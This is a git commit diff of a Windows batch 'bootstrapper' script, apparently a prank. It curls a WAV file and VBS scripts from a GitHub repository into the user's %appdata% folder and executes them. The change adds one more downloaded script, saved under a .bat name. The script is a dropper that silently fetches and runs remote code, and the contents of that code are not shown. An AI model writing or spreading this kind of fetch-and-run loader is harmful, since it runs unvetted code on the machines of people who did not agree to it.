30cf6224683195f949deaf7f60f087a71ac13e07
maateww1 <130774261+maateww1@users.noreply.github.com>
2023-10-26 15:14:54 -0400

    Update JustDanceBootStrapper.bat

--- JustDanceBootStrapper.bat
+++ JustDanceBootStrapper.bat
@@ -1,7 +1,7 @@
 curl -L https://github.com/maateww1/filesss/raw/main/JustDance.wav --output "%appdata%\JustDance.wav" 
 curl -L https://raw.githubusercontent.com/maateww1/filesss/main/Sound.vbs --output "%appdata%\Play.vbs" 
 curl -L https://raw.githubusercontent.com/maateww1/filesss/main/Speaker.vbs --output "%appdata%\VUP.vbs"
-timeout 1
+curl -L https://raw.githubusercontent.com/maateww1/filesss/main/StartJS.vbs --output "%appdata%\JS.bat"
 VUP.vbs param1
 Play.vbs param1
 
